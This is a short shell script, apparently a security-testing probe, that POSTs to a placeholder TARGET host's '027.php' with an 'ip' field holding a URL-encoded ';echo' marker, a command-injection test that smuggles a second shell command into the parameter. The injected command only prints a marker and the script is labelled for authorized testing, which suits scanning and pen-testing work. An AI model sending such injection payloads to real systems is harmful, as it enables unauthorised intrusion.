#!/usr/bin/env sh
set -eu
# Authorized testing only. Replace TARGET after review.
curl -sS -i -X POST 'http://TARGET:8080/027.php' \
  -H 'User-Agent: Sunset-AWVS-Probe/1.0' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'ip=%3Becho%20SUNSET_CMD_MARKER'
